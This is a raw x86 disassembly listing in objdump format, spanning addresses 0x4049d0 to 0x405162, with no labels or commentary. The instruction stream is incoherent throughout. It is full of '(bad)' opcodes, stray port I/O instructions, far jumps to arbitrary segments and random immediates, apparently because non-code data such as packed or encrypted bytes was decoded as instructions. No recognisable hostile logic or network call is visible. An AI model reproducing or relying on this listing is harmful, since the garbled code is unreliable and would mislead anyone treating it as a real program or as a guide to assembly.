  4049d0:	leave  
  4049d1:	ror    DWORD PTR [esi+0x7d021565],1
  4049d7:	not    BYTE PTR [ebp-0x52]
  4049da:	shl    BYTE PTR [edi],0x32
  4049dd:	sbb    BYTE PTR [eax],dh
  4049df:	outs   dx,BYTE PTR ds:[esi]
  4049e0:	adc    al,0x50
  4049e2:	mov    esp,0x7b7c1b5d
  4049e7:	dec    edi
  4049e8:	ret    0x4f6
  4049eb:	and    ecx,ebx
  4049ed:	push   ds
  4049ee:	fwait
  4049ef:	nop
  4049f0:	pop    ecx
  4049f1:	arpl   WORD PTR [esi],bp
  4049f3:	or     DWORD PTR [esp+ebx*1],esp
  4049f6:	xlat   BYTE PTR ds:[ebx]
  4049f7:	jno    0x4049a2
  4049f9:	dec    sp
  4049fb:	and    ebx,DWORD PTR [ecx-0x521f5fa9]
  404a01:	stos   BYTE PTR es:[edi],al
  404a02:	sbb    DWORD PTR [edx+esi*2-0x4e],0xa0910981
  404a0a:	in     al,0x63
  404a0c:	stos   BYTE PTR es:[edi],al
  404a0d:	cwde   
  404a0e:	mov    edi,0xca597254
  404a13:	test   DWORD PTR [edx-0x7a],edi
  404a16:	enter  0x8920,0x54
  404a1a:	ret    
  404a1b:	xor    DWORD PTR [esi-0xb],ebp
  404a1e:	fldcw  WORD PTR [ebx+0x2a96d394]
  404a24:	xchg   ebp,eax
  404a25:	adc    esp,edi
  404a27:	(bad)  
  404a29:	ins    BYTE PTR es:[edi],dx
  404a2a:	jle    0x404a93
  404a2c:	fiadd  DWORD PTR [esi+0x87b187a]
  404a32:	mov    cl,0xd9
  404a34:	mov    eax,0x1fe33730
  404a39:	sub    esi,edi
  404a3b:	gs pop edi
  404a3d:	cdq    
  404a3e:	mov    bl,0x57
  404a40:	xchg   ebx,eax
  404a41:	dec    esi
  404a42:	rol    BYTE PTR [edi-0x533bf6ab],1
  404a48:	jmp    0x1d3db175
  404a4d:	pop    ss
  404a4e:	push   ebp
  404a4f:	fbld   TBYTE PTR [edi+0x74eb4070]
  404a55:	cmp    eax,0x7d710688
  404a5a:	dec    ebp
  404a5b:	scas   eax,DWORD PTR es:[edi]
  404a5c:	jbe    0x404a0a
  404a5e:	push   ds
  404a5f:	or     edi,eax
  404a61:	mov    ebx,0x14206a18
  404a66:	fwait
  404a67:	jb     0x404a8e
  404a69:	pushf  
  404a6a:	std    
  404a6b:	(bad)  
  404a6d:	mov    dh,0x25
  404a6f:	imul   esi,DWORD PTR [ebx+0x26],0xffffffae
  404a73:	jne    0x404a24
  404a75:	fdiv   QWORD PTR [eax]
  404a77:	fadd   QWORD PTR [esi+0x6d2abf62]
  404a7d:	add    eax,0xc614e4be
  404a82:	cmc    
  404a83:	xor    edx,DWORD PTR [edi]
  404a85:	mov    ch,0x9
  404a87:	cmp    ecx,DWORD PTR [edi+edi*4+0x78]
  404a8b:	push   ebp
  404a8c:	pop    edx
  404a8d:	enter  0x21be,0x96
  404a91:	outs   dx,BYTE PTR ds:[esi]
  404a92:	repnz pop ebx
  404a94:	push   0xda255642
  404a99:	fild   DWORD PTR [ecx-0x4680861d]
  404a9f:	loope  0x404a7a
  404aa1:	push   edx
  404aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa3:	dec    ebx
  404aa4:	push   ecx
  404aa5:	adc    eax,0xd7df95a7
  404aaa:	dec    eax
  404aab:	adc    DWORD PTR [eax],0xffffffe7
  404aae:	addr16 cli 
  404ab0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ab1:	mov    esp,0x84d50a98
  404ab6:	outs   dx,DWORD PTR ds:[esi]
  404ab7:	and    esi,edi
  404ab9:	pop    ds
  404aba:	fucomip st,st(7)
  404abc:	(bad)
  404abf:	pushfw 
  404ac1:	enter  0x2292,0xdf
  404ac5:	js     0x404b3c
  404ac7:	ss xchg ebp,eax
  404ac9:	pop    ecx
  404aca:	dec    esi
  404acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404acc:	jae    0x404a6c
  404ace:	enter  0x9567,0xee
  404ad2:	push   ds
  404ad3:	in     eax,dx
  404ad4:	(bad)  
  404ad6:	bnd jmp DWORD PTR [esi-0x3d42cfdc]
  404add:	sub    DWORD PTR [ebp+0x75],esi
  404ae0:	fild   QWORD PTR [edi+0x16fed367]
  404ae6:	mov    al,0xaa
  404ae8:	daa    
  404ae9:	sub    bl,BYTE PTR [ecx-0x62e4d05d]
  404aef:	leave  
  404af0:	or     ch,ah
  404af2:	outs   dx,DWORD PTR ds:[esi]
  404af3:	pop    edi
  404af4:	data16 clc 
  404af6:	mov    esp,0xf56193d6
  404afb:	add    ecx,esi
  404afd:	imul   edi,DWORD PTR [eax-0x48],0x53d94a61
  404b04:	add    al,0xe3
  404b06:	sub    al,0x20
  404b08:	inc    dh
  404b0a:	mov    edx,0x68d32580
  404b0f:	jle    0x404b11
  404b11:	mov    BYTE PTR [edx-0x1],dl
  404b14:	mov    ah,0xfc
  404b16:	in     al,0x36
  404b18:	aad    0x54
  404b1a:	clc    
  404b1b:	sbb    edx,DWORD PTR [edx-0x7d]
  404b1e:	stc    
  404b1f:	mov    edi,0xbb87a1fa
  404b24:	rcr    BYTE PTR [ebx],cl
  404b26:	rol    BYTE PTR ds:0x8dd6471f,1
  404b2c:	mov    bl,0x1e
  404b2e:	mov    cl,0x3a
  404b30:	cmp    DWORD PTR [ebx+esi*4],ecx
  404b33:	add    DWORD PTR [eax],esi
  404b35:	call   0x56f56ead
  404b3a:	inc    edi
  404b3b:	imul   eax,DWORD PTR [edi-0x4039ae4],0x4808d93a
  404b45:	lock inc ebp
  404b47:	outs   dx,DWORD PTR ds:[esi]
  404b48:	jmp    0x8e66:0x21b84d46
  404b4f:	add    BYTE PTR [ecx+0x6a],bl
  404b52:	push   ebp
  404b53:	push   esi
  404b54:	test   BYTE PTR [eax-0x50c83f5b],al
  404b5a:	inc    ebp
  404b5b:	fcomp  DWORD PTR [edx-0x1]
  404b5e:	inc    edx
  404b5f:	jne    0x404ba5
  404b61:	mov    ebp,0x6cf26082
  404b66:	shl    DWORD PTR [ebx-0x7c3a4cf4],cl
  404b6c:	test   eax,0xcc942010
  404b71:	xor    BYTE PTR ds:[eax+esi*4],0x5a
  404b76:	sar    DWORD PTR ds:0x1d8d5717,cl
  404b7c:	and    eax,0xc9f9f87b
  404b81:	imul   ebx,DWORD PTR [edi+0x4a],0x91fa2680
  404b88:	push   es
  404b89:	fbstp  TBYTE PTR [eax]
  404b8b:	ficom  WORD PTR [edi-0x15d550b6]
  404b91:	add    ebp,ebx
  404b93:	jno    0x404bdd
  404b95:	pusha  
  404b96:	mov    al,ds:0xe74b5fc4
  404b9b:	mov    cl,0x6d
  404b9d:	jns    0x404c08
  404b9f:	jae    0x404b8c
  404ba1:	mov    bh,0x47
  404ba3:	in     al,0x5b
  404ba5:	retf   
  404ba6:	or     ebx,ecx
  404ba8:	fwait
  404ba9:	push   ebp
  404baa:	shr    DWORD PTR [eax],1
  404bac:	and    eax,0xc9de0d7d
  404bb1:	outs   dx,BYTE PTR ds:[esi]
  404bb2:	cmc    
  404bb3:	jbe    0x404b50
  404bb5:	jmp    0x404c13
  404bb7:	cmp    BYTE PTR [edx+0x12],ch
  404bba:	or     al,0x51
  404bbc:	into   
  404bbd:	dec    ebx
  404bbe:	loopne 0x404c1c
  404bc0:	xor    al,0x41
  404bc2:	xchg   ebp,eax
  404bc3:	out    0x57,al
  404bc5:	jecxz  0x404c2c
  404bc7:	add    ah,BYTE PTR [eax-0x4b1f9ce3]
  404bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bce:	inc    ecx
  404bcf:	popf   
  404bd0:	int3   
  404bd1:	jne    0x404bc9
  404bd3:	add    al,0x9c
  404bd5:	ins    BYTE PTR es:[edi],dx
  404bd6:	out    dx,al
  404bd7:	mov    eax,ds:0xbda7f9a8
  404bdc:	jae    0x404c42
  404bde:	rol    edx,0x14
  404be1:	nop    DWORD PTR [eax+0x74d2f3c8]
  404be8:	xor    esp,ebp
  404bea:	int    0xaf
  404bec:	push   es
  404bed:	sahf   
  404bee:	icebp  
  404bef:	mov    cl,0xe2
  404bf1:	jl     0x404c1f
  404bf3:	sub    BYTE PTR [eax],dh
  404bf5:	in     eax,0xc5
  404bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bf8:	stos   BYTE PTR es:[edi],al
  404bf9:	push   es
  404bfa:	sub    dl,BYTE PTR [esi]
  404bfc:	xor    BYTE PTR [ecx+0x1709419f],bl
  404c02:	add    eax,0x9e0fa73a
  404c07:	push   0x2a
  404c09:	sub    DWORD PTR [edi-0x37],esi
  404c0c:	call   0xccf4:0x2086e4eb
  404c13:	and    edi,DWORD PTR [eax+0x71fb27e4]
  404c19:	sub    eax,0xd9afa1b9
  404c1e:	int3   
  404c1f:	stos   BYTE PTR es:[edi],al
  404c20:	push   eax
  404c21:	scas   al,BYTE PTR es:[edi]
  404c22:	loopne 0x404c89
  404c24:	imul   edx,DWORD PTR [esi-0x18],0x98d4cd2
  404c2b:	xchg   ch,al
  404c2d:	pop    ebx
  404c2e:	push   ds
  404c2f:	enter  0x8596,0x2
  404c33:	sbb    ecx,DWORD PTR [ecx]
  404c35:	mov    eax,0x1663e05d
  404c3a:	outs   dx,BYTE PTR ds:[esi]
  404c3b:	fst    QWORD PTR [ebx]
  404c3d:	stc    
  404c3e:	(bad)  
  404c3f:	rcl    BYTE PTR [eax],1
  404c41:	mov    esp,0x58df2cca
  404c46:	push   ss
  404c47:	ins    BYTE PTR es:[edi],dx
  404c48:	repnz push 0xffffffba
  404c4b:	pop    ss
  404c4c:	sbb    eax,0x37086891
  404c51:	add    al,0x9
  404c53:	dec    edx
  404c54:	retf   0x700d
  404c57:	adc    BYTE PTR ds:0x35f7f7b5,cl
  404c5d:	xor    BYTE PTR [edx-0x5d],bl
  404c60:	jno    0x404cd9
  404c62:	ficomp WORD PTR [ecx+0x58]
  404c65:	mov    ecx,0xb5a1d8e3
  404c6a:	cmp    ebp,DWORD PTR [esi]
  404c6c:	(bad)  
  404c6d:	cmp    al,0x48
  404c6f:	jns    0x404c36
  404c71:	mov    ds:0xf55ce6d1,eax
  404c76:	and    BYTE PTR [ebp-0x65],cl
  404c79:	push   edx
  404c7a:	jnp    0x404c4d
  404c7c:	adc    ah,BYTE PTR [esi+0x23]
  404c7f:	mov    gs,WORD PTR [eax]
  404c81:	and    dh,al
  404c83:	mov    dl,0x38
  404c85:	or     al,0xa6
  404c87:	xchg   esp,eax
  404c88:	dec    eax
  404c89:	mov    ebx,0x63f186b5
  404c8e:	out    0x7b,eax
  404c90:	fst    DWORD PTR [ebp+0x5e]
  404c93:	push   esp
  404c94:	popf   
  404c95:	sub    DWORD PTR [ebx+ecx*4-0x52a99638],edi
  404c9c:	inc    ecx
  404c9d:	cmp    ebp,ebp
  404c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ca0:	addr16 dec esp
  404ca2:	push   es
  404ca3:	test   eax,0xa971da91
  404ca8:	or     eax,0xa63b176
  404cad:	rcl    BYTE PTR [ebp-0xc],1
  404cb0:	imul   ebp,DWORD PTR [ecx+0x6aa202fc],0xffffff99
  404cb7:	sti    
  404cb8:	sbb    eax,0x2f2fb32a
  404cbd:	jp     0x404d37
  404cbf:	pop    es
  404cc0:	and    DWORD PTR [esi+edx*8-0x6],ecx
  404cc4:	into   
  404cc5:	pop    ss
  404cc6:	std    
  404cc7:	(bad)  
  404cc8:	mov    esp,0x4464505c
  404ccd:	clc    
  404cce:	push   ebx
  404ccf:	dec    esi
  404cd0:	push   ds
  404cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd2:	sbb    DWORD PTR [ecx-0x7d0e0006],ecx
  404cd8:	push   es
  404cd9:	imul   ecx,DWORD PTR [ecx+0x48e2c09c],0xffffffc5
  404ce0:	out    dx,eax
  404ce1:	dec    ebp
  404ce2:	mov    edi,0x7faadfc1
  404ce7:	dec    esi
  404ce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce9:	and    DWORD PTR [ecx],edi
  404ceb:	daa    
  404cec:	dec    edi
  404ced:	mov    bh,BYTE PTR [edi-0x2f9ca675]
  404cf3:	cmp    DWORD PTR gs:[eax-0x70],edi
  404cf7:	sbb    BYTE PTR [esi],ch
  404cf9:	jecxz  0x404d0f
  404cfb:	int    0x9c
  404cfd:	sahf   
  404cfe:	daa    
  404cff:	mov    ch,0xb2
  404d01:	rcr    BYTE PTR [eax+0x4dcd71ed],cl
  404d07:	iret   
  404d08:	retf   
  404d09:	mov    ebp,0x735624bb
  404d0e:	jne    0x404cc3
  404d10:	cmc    
  404d11:	dec    ecx
  404d12:	(bad)  
  404d13:	(bad)  
  404d15:	fistp  DWORD PTR [eax+0x6f]
  404d18:	inc    ebp
  404d19:	mov    ebp,ss
  404d1b:	std    
  404d1c:	adc    ecx,DWORD PTR [ebp-0x17e9e853]
  404d22:	shl    BYTE PTR [eax+0x3ceaa84e],cl
  404d28:	mov    WORD PTR [ebx],cs
  404d2a:	cmp    eax,0x52afde2d
  404d2f:	pop    esi
  404d30:	inc    edx
  404d31:	cld    
  404d32:	inc    ebx
  404d33:	add    esi,DWORD PTR [ebp+edx*8+0x2b]
  404d37:	mov    dl,0xc2
  404d39:	pop    edx
  404d3a:	adc    al,0x89
  404d3c:	jl     0x404d86
  404d3e:	dec    edi
  404d3f:	mov    ch,BYTE PTR [esi+0x4]
  404d42:	jle    0x404db2
  404d44:	cmp    esp,edx
  404d46:	shl    DWORD PTR [edx-0x5bb368b6],0x5
  404d4d:	(bad)  
  404d4e:	sub    eax,DWORD PTR [esi-0x5]
  404d51:	sbb    DWORD PTR [esi],esi
  404d53:	dec    esi
  404d54:	clc    
  404d55:	fdiv   QWORD PTR [ecx*1+0x790a0a03]
  404d5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d5d:	add    ebx,DWORD PTR [edi+0x6ed7eb05]
  404d63:	rol    BYTE PTR [edi+0x3d58aa3c],0xe7
  404d6a:	loope  0x404d1e
  404d6c:	cs pop edx
  404d6e:	mov    edi,0x21e28449
  404d73:	mov    dl,0xb4
  404d75:	adc    edx,DWORD PTR [eax-0x35]
  404d78:	je     0x404de2
  404d7a:	stos   DWORD PTR es:[edi],eax
  404d7b:	push   0xffffffd3
  404d7d:	jae    0x404d3a
  404d7f:	jge    0x404d16
  404d81:	or     al,0xde
  404d83:	sbb    DWORD PTR [eax+0x5e416108],edi
  404d89:	mov    eax,0xaeb24584
  404d8e:	sub    BYTE PTR [edx+0xb622c00],0x3
  404d95:	gs hlt 
  404d97:	aam    0x45
  404d99:	loope  0x404dd8
  404d9b:	out    dx,eax
  404d9c:	imul   eax,esp,0x87357e04
  404da2:	push   ecx
  404da3:	sub    al,0x56
  404da5:	xor    eax,0x6d58620f
  404daa:	adc    cl,BYTE PTR [edx-0x57]
  404dad:	jmp    0x1805:0x4d0c72de
  404db4:	push   esi
  404db5:	pop    eax
  404db6:	popa   
  404db7:	js     0x404db7
  404db9:	or     eax,0x5cbc698e
  404dbe:	cld    
  404dbf:	(bad)  
  404dc0:	push   ebp
  404dc1:	js     0x404dd9
  404dc3:	mov    bh,BYTE PTR [esi-0x6c]
  404dc6:	or     dl,BYTE PTR [esi]
  404dc8:	push   0x6c
  404dca:	pop    ds
  404dcb:	lods   al,BYTE PTR ds:[esi]
  404dcc:	loop   0x404de8
  404dce:	cdq    
  404dcf:	add    al,al
  404dd1:	(bad)  
  404dd2:	cmp    eax,0x8b56311a
  404dd7:	out    dx,al
  404dd8:	loope  0x404d97
  404dda:	mov    ds:0xdbf20f9e,eax
  404ddf:	lock aas 
  404de1:	mov    ecx,0x136796f7
  404de6:	mov    ebp,0x9af28405
  404deb:	inc    esp
  404dec:	sbb    al,0x98
  404dee:	mov    eax,0x92af09d0
  404df3:	fsubr  QWORD PTR [edx+0xaad4f54]
  404df9:	cdq    
  404dfa:	mov    bh,0xb9
  404dfc:	jp     0x404e3b
  404dfe:	add    ah,BYTE PTR [ebp+0x1]
  404e01:	sbb    al,0x3
  404e03:	call   0xcdd4:0xe9ad2bd4
  404e0a:	aaa    
  404e0b:	loopne 0x404e02
  404e0d:	imul   edi,DWORD PTR [ecx-0x59305bd0],0xaa90fad0
  404e17:	xor    eax,edi
  404e19:	lea    ecx,[edi]
  404e1b:	inc    esi
  404e1c:	ins    BYTE PTR es:[edi],dx
  404e1d:	pop    ebp
  404e1e:	sub    DWORD PTR [eax],eax
  404e20:	xor    BYTE PTR [ebx*2+0x551d46a9],dl
  404e27:	popw   ds
  404e29:	dec    esp
  404e2a:	xor    ch,bh
  404e2c:	add    bh,ah
  404e2e:	aaa    
  404e2f:	sti    
  404e30:	scas   al,BYTE PTR es:[edi]
  404e31:	xchg   edi,eax
  404e32:	outs   dx,DWORD PTR ds:[esi]
  404e33:	xlat   BYTE PTR ds:[ebx]
  404e34:	fisub  DWORD PTR [ebx+0x20]
  404e37:	aam    0xf0
  404e39:	aam    0x15
  404e3b:	jae    0x404eae
  404e3d:	dec    ecx
  404e3e:	test   al,0xc6
  404e40:	adc    DWORD PTR [ebp+ebp*8+0x19688355],0xffffffbb
  404e48:	jo     0x404e56
  404e4a:	jb     0x404e5d
  404e4c:	and    bh,bh
  404e4e:	inc    edi
  404e4f:	repnz adc DWORD PTR ds:0xfae4f1a9,esi
  404e56:	shl    DWORD PTR [edi+0x10],cl
  404e59:	inc    ebx
  404e5a:	xchg   ebp,eax
  404e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e5c:	push   ds
  404e5d:	int3   
  404e5e:	xchg   BYTE PTR [esp+eax*2],bh
  404e61:	das    
  404e62:	xchg   ebp,eax
  404e63:	mov    ecx,0xe155f234
  404e68:	jnp    0x404e00
  404e6a:	call   0x233f746f
  404e6f:	jmp    0x8456:0xe8896bea
  404e76:	in     eax,dx
  404e77:	push   es
  404e78:	mov    ah,0x30
  404e7a:	fwait
  404e7b:	add    al,0x35
  404e7d:	adc    ebp,ecx
  404e7f:	inc    ebx
  404e80:	adc    BYTE PTR [ecx],cl
  404e82:	stos   BYTE PTR es:[edi],al
  404e83:	mov    eax,ds:0xaad26a2f
  404e88:	idiv   DWORD PTR [esi+0x5bdaa548]
  404e8e:	push   ebx
  404e8f:	mov    al,0x6d
  404e91:	(bad)  
  404e92:	int3   
  404e93:	fs stc 
  404e95:	(bad)  
  404e96:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404e98:	push   edx
  404e99:	mov    ebx,0x53628366
  404e9e:	jmp    0x404f0a
  404ea0:	nop
  404ea1:	pop    ebp
  404ea2:	add    DWORD PTR [edi],0x2724e9
  404ea8:	xor    BYTE PTR [esi+0x60e19c4a],dh
  404eae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eaf:	shl    ebx,0x5d
  404eb2:	mov    ss,WORD PTR [ebx]
  404eb4:	outs   dx,DWORD PTR ds:[esi]
  404eb5:	dec    eax
  404eb6:	lods   al,BYTE PTR ds:[esi]
  404eb7:	pop    edi
  404eb8:	in     eax,0x66
  404eba:	pop    ecx
  404ebb:	sbb    DWORD PTR [ebx],edi
  404ebd:	sbb    dl,dh
  404ebf:	ds pop edi
  404ec1:	jg     0x404e85
  404ec3:	out    0xbb,eax
  404ec5:	dec    esi
  404ec6:	cld    
  404ec7:	in     eax,0xb0
  404ec9:	(bad)  
  404eca:	mov    dh,0xd9
  404ecc:	imul   dh
  404ece:	mov    edi,0xd20afda1
  404ed3:	scas   al,BYTE PTR es:[edi]
  404ed4:	ins    DWORD PTR es:[edi],dx
  404ed5:	mov    edx,0x9b00198e
  404eda:	inc    esp
  404edb:	dec    edx
  404edc:	mov    ah,0x33
  404ede:	dec    ebx
  404edf:	adc    edx,DWORD PTR es:[ebp-0x4d162438]
  404ee6:	xchg   edx,eax
  404ee7:	sub    DWORD PTR [ecx-0x53],ebx
  404eea:	mov    WORD PTR [esi+0x5a],ss
  404eed:	sub    DWORD PTR [ebp-0x39],esp
  404ef0:	push   ss
  404ef1:	out    dx,al
  404ef2:	fwait
  404ef3:	(bad)  
  404ef7:	test   eax,0x98cadaef
  404efc:	xchg   edi,eax
  404efd:	mov    ecx,esp
  404eff:	lea    edi,[ebp-0x11d07ee0]
  404f05:	inc    esp
  404f06:	jo     0x404e94
  404f08:	call   0x172b66c2
  404f0d:	inc    ebx
  404f0e:	fsubr  QWORD PTR [ecx]
  404f10:	push   eax
  404f11:	mov    esi,gs
  404f13:	inc    esp
  404f14:	mov    cl,0x2b
  404f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f17:	imul   esp,DWORD PTR [esi],0xfffffff8
  404f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1b:	fndisi(8087 only) 
  404f1d:	sbb    DWORD PTR [ebp+0xd],ecx
  404f20:	mov    es,WORD PTR [ebp-0x442381a3]
  404f26:	rcr    bh,1
  404f28:	pop    ebx
  404f29:	outs   dx,DWORD PTR ds:[esi]
  404f2a:	push   esp
  404f2b:	mov    ebx,0xd20c760
  404f30:	jmp    0x404f70
  404f32:	repz adc DWORD PTR [eax+0x33],edi
  404f36:	imul   esp,DWORD PTR [eax+eiz*1+0x15],0xfffffffc
  404f3b:	sbb    al,0xda
  404f3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3e:	out    dx,eax
  404f3f:	hlt    
  404f40:	mov    DWORD PTR ds:0x2e7b852c,edi
  404f46:	ss in  eax,0x84
  404f49:	or     al,0x8f
  404f4b:	jecxz  0x404f03
  404f4d:	sar    BYTE PTR [edx],1
  404f4f:	push   ecx
  404f50:	pop    ss
  404f51:	jo     0x404ef9
  404f53:	cli    
  404f54:	pop    ss
  404f55:	pop    esp
  404f56:	ss push 0xad4046a4
  404f5c:	in     eax,dx
  404f5d:	rcr    DWORD PTR [edi-0x10],1
  404f60:	sbb    BYTE PTR [ebp*8+0x14a26f34],al
  404f67:	ret    0x1c9
  404f6a:	cwde   
  404f6b:	mov    DWORD PTR [esi+edx*8],ebp
  404f6e:	pop    ebp
  404f6f:	cmp    BYTE PTR [ecx+0x40],ah
  404f72:	lds    edi,FWORD PTR [edx]
  404f74:	add    BYTE PTR [eax],cl
  404f76:	mov    ch,0x74
  404f78:	pop    es
  404f79:	mov    ebp,0x42f317b0
  404f7e:	arpl   WORD PTR ds:0xa8687efb,ax
  404f84:	retf   0x84a1
  404f87:	shr    DWORD PTR [ecx+esi*8+0x2856b216],0xd4
  404f8f:	adc    eax,0x2d8486e5
  404f94:	sbb    BYTE PTR [edi-0x12],0x20
  404f98:	inc    ecx
  404f99:	sub    ah,BYTE PTR [esi]
  404f9b:	push   ds
  404f9c:	inc    ecx
  404f9d:	adc    ebx,DWORD PTR [di-0x284]
  404fa2:	jg     0x404f68
  404fa4:	scas   al,BYTE PTR es:[edi]
  404fa5:	idiv   BYTE PTR [eax+edx*2+0x58]
  404fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404faa:	push   esi
  404fab:	aad    0x11
  404fad:	mov    gs,WORD PTR [edx-0x34]
  404fb0:	pop    ebx
  404fb1:	rcr    BYTE PTR [ecx+0x36],1
  404fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb5:	ret    
  404fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fb7:	in     eax,0xde
  404fb9:	je     0x404fd5
  404fbb:	shl    DWORD PTR [ebx],1
  404fbd:	push   eax
  404fbe:	inc    eax
  404fbf:	scas   eax,DWORD PTR es:[edi]
  404fc0:	clc    
  404fc1:	sbb    esp,DWORD PTR [ebx+0x4a17a8a0]
  404fc7:	mov    ebp,0x971bfff8
  404fcc:	in     eax,0x21
  404fce:	dec    esp
  404fcf:	push   ds
  404fd0:	aaa    
  404fd1:	ins    DWORD PTR es:[edi],dx
  404fd2:	scas   al,BYTE PTR es:[edi]
  404fd3:	or     eax,0xd9650607
  404fd8:	pop    eax
  404fd9:	pop    ss
  404fda:	inc    esp
  404fdb:	jp     0x404fae
  404fdd:	loopne 0x404ff7
  404fdf:	cmp    al,0xae
  404fe1:	mov    eax,ds:0x867c96fa
  404fe6:	or     bl,bh
  404fe8:	mov    eax,0x67b07888
  404fed:	adc    eax,0xc87bd03e
  404ff2:	or     esi,ebp
  404ff4:	addr16 cmp al,dl
  404ff7:	enter  0x21e4,0xdf
  404ffb:	xchg   BYTE PTR [eax+eiz*8+0x65],bl
  404fff:	xchg   edi,eax
  405000:	push   ebx
  405001:	xchg   BYTE PTR [ecx-0x1f],bl
  405004:	loopne 0x405035
  405006:	out    dx,al
  405007:	jl     0x404fad
  405009:	and    BYTE PTR [edi],bl
  40500b:	mov    ds,WORD PTR [edi-0x7e08b6af]
  405011:	stos   DWORD PTR es:[edi],eax
  405012:	test   al,0x9b
  405014:	rcr    eax,cl
  405016:	push   0x16
  405018:	sbb    BYTE PTR [edi-0x7a],cl
  40501b:	leave  
  40501c:	adc    esp,DWORD PTR [esi+0x42]
  40501f:	bound  edi,QWORD PTR [ecx+ecx*2+0x3f11b7bd]
  405026:	jmp    0xdcbe:0x1826fcca
  40502d:	mov    bl,0x6c
  40502f:	xor    bh,dh
  405031:	jmp    0x405009
  405033:	or     BYTE PTR [eax-0x18],ah
  405036:	inc    esp
  405037:	in     eax,0xd8
  405039:	cld    
  40503a:	(bad)  
  40503b:	cs js  0x405067
  40503e:	mov    al,0xb4
  405040:	fisubr WORD PTR [eax]
  405042:	test   eax,0xd1481f20
  405047:	mov    al,0xbb
  405049:	repnz loopne 0x4050b1
  40504c:	push   eax
  40504d:	(bad)  
  40504e:	mov    ch,0x1a
  405050:	icebp  
  405051:	mov    bh,0xd4
  405053:	push   ebx
  405054:	jbe    0x405056
  405056:	test   DWORD PTR [ecx],edi
  405058:	dec    edx
  405059:	fstp   QWORD PTR [ebp-0x35]
  40505c:	add    al,0x38
  40505e:	les    esp,FWORD PTR [ecx+0x16bb2cea]
  405064:	repz cmp BYTE PTR [ebx-0x622f8a1],cl
  40506b:	push   esp
  40506c:	or     dl,BYTE PTR [esi]
  40506e:	daa    
  40506f:	imul   ebp,ecx,0xffffffcd
  405072:	xor    eax,0xce03efa6
  405077:	xchg   esi,eax
  405078:	dec    edx
  405079:	aas    
  40507a:	sbb    al,BYTE PTR [ecx]
  40507c:	retf   0x5acf
  40507f:	cmp    ecx,edi
  405081:	inc    esi
  405082:	push   ebx
  405083:	sub    DWORD PTR ds:0x1306b5b2,edi
  405089:	push   0xe4c7615d
  40508e:	(bad)  
  40508f:	fcomp  QWORD PTR [esi]
  405091:	add    al,0x46
  405093:	mov    WORD PTR [eax],?
  405095:	dec    ecx
  405096:	sub    BYTE PTR [ecx+0x4a98765],bh
  40509c:	push   cs
  40509d:	leave  
  40509e:	jge    0x40502e
  4050a0:	repz push 0xaa68bd1b
  4050a6:	mov    ecx,0x7f6182ae
  4050ab:	push   es
  4050ac:	popa   
  4050ad:	or     dh,BYTE PTR [ebp+0x23]
  4050b0:	rcr    ebp,1
  4050b2:	xor    BYTE PTR [edi+0x420f5c3c],dh
  4050b8:	cmp    al,0x43
  4050ba:	pushf  
  4050bb:	push   eax
  4050bc:	cmp    al,0x41
  4050be:	mov    edx,DWORD PTR [edi+esi*1-0x4389efab]
  4050c5:	inc    esp
  4050c6:	jns    0x4050e2
  4050c8:	mov    eax,0x472a321e
  4050cd:	stc    
  4050ce:	push   es
  4050cf:	push   cs
  4050d0:	add    BYTE PTR [esi-0x2d],al
  4050d3:	xor    DWORD PTR [ecx],ebx
  4050d5:	push   ds
  4050d6:	or     bh,BYTE PTR [edi+0x3f]
  4050d9:	dec    esi
  4050da:	jecxz  0x4050d7
  4050dc:	xor    ch,bh
  4050de:	(bad)  
  4050df:	(bad)  
  4050e0:	mov    bl,BYTE PTR ds:0xc45c0429
  4050e6:	ins    DWORD PTR es:[edi],dx
  4050e7:	jbe    0x405147
  4050e9:	add    DWORD PTR ds:0x1039edaa,edi
  4050ef:	repnz mov eax,0x348fe2da
  4050f5:	data16 jle 0x4050eb
  4050f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050f9:	imul   edi,DWORD PTR [esi],0x8d8df25b
  4050ff:	shl    DWORD PTR [ebx+0x1c4396dd],cl
  405105:	and    ebp,DWORD PTR [edx-0x17908a7a]
  40510b:	imul   ebp,DWORD PTR [ebp+0x2297f2d5],0xd91f532c
  405115:	stos   DWORD PTR es:[edi],eax
  405116:	fdiv   QWORD PTR ds:0xd9729865
  40511c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40511d:	outs   dx,BYTE PTR ds:[esi]
  40511e:	xchg   BYTE PTR [edi-0x7d],bh
  405121:	(bad)  
  405122:	bound  eax,QWORD PTR [edi+0x51]
  405125:	pop    ds
  405126:	lods   eax,DWORD PTR ds:[esi]
  405127:	mov    esi,0x82bdf26
  40512c:	add    al,0x6a
  40512e:	fcom   QWORD PTR [edi-0x29]
  405131:	in     eax,dx
  405132:	mov    ds:0xa176710c,al
  405138:	repz adc bl,BYTE PTR [edx]
  40513b:	pop    edi
  40513c:	je     0x40519e
  40513e:	(bad)  
  40513f:	aam    0x9b
  405141:	push   0xaf63f734
  405146:	mov    al,ds:0xe8b814d8
  40514b:	jae    0x405172
  40514d:	ret    0x15f3
  405150:	mov    ecx,0x449dfb0d
  405155:	mov    ds:0xc17f052f,al
  40515a:	cmp    BYTE PTR [ecx],dl
  40515c:	cmc    
  40515d:	mov    al,0x9b
  40515f:	pop    edx
  405160:	addr16 push es
  405162:	add    dh,bh
